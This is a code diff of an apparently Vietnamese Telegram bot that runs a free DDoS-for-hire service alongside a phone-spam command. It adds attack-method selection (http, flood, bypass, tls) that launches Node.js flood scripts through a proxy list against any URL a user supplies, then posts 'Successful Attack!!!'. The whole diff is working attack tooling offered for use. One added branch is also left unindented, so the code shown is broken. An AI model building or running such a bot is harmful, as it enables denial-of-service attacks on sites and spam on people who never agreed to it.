@@ -131,6 +131,7 @@ def help(message):
 ┗━━━━━━━━━━━━━━➤
 - /spam <số điện thoại> : Để tiến hành spam
 - /ddosfree <url> : Để tiến hành tấn công ddos
+- /methods xem phương thức tấn công
 ┏━━━━━━━━━━━━━━┓
 ┃  Lệnh Có Ích
 ┗━━━━━━━━━━━━━━➤
@@ -163,12 +164,11 @@ def aygspws(message):
 def methods(message):
     help_text = '''
 --- LAYER 7 ---
-CF-BYPASS
-HTTP-LOAD
+BYPASS
+HTTP
 FLOOD
 --- LAYER 4 ---
-TCP-FLOOD
-UDP-FLOOD
+TCP
 '''
     bot.reply_to(message, help_text)
 
@@ -206,10 +206,12 @@ def ddos_command(message):
         bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
         return
 
-    if len(message.text.split()) < 2:
-        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /ddosfree <url>')
+    if len(message.text.split()) < 3:
+        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /ddosfree <method> <url>')
         return
 
+    method = message.text.split()[1]
+    host = message.text.split()[2] 
     username = message.from_user.username
 
     current_time = time.time()
@@ -217,17 +219,23 @@ def ddos_command(message):
         remaining_time = int(10 - (current_time - cooldown_dict[username].get('attack', 0)))
         bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh")
         return
-    
-    host = message.text.split()[1]
+    if method == "http":
     command = ["node", "flood.js", host, "120", "32", "20000", "proxy.txt"]
-    duration = 120
+    elif method == "flood":
+        command = ["node", "floodvietnam.js", host, "120", "20000", "20000", "proxy.txt", "flood"]
+    elif method == "bypass":
+        command = ["node", "floodvietnam.js", host, "120", "20000", "20000", "proxy.txt", "bypass"]
+    elif method == "tls":
+        command = ["node", "Linzz.js", host, "120", "32", "20000", "proxy.txt"]
+    else:
+        bot.reply_to(message, 'Method erron\nMethod Start Attack\nflood\nbypass\ntls\nhttp\nHow to run /ddosfree <Method> <url>')
+        return
 
     cooldown_dict[username] = {'attack': current_time}
 
-    attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
+    attack_thread = threading.Thread(target=run_attack, args=(command, 120, message))
     attack_thread.start()
-    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin : Quang\n  ➤ Tấn Công Bởi » {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 120 «\n  ➤ Methods » TLS VIP«\n  ➤ Cooldown » 10s «\n  ➤ Plan » Free «')
-
+    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin : Quang\n  ➤ Tấn Công Bởi » {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 120 «\n  ➤ Methods » {method.upper()} «\n  ➤ Cooldown » 10s «\n  ➤ Plan » Free «')
 
 @bot.message_handler(commands=['proxy'])
 def proxy_command(message):
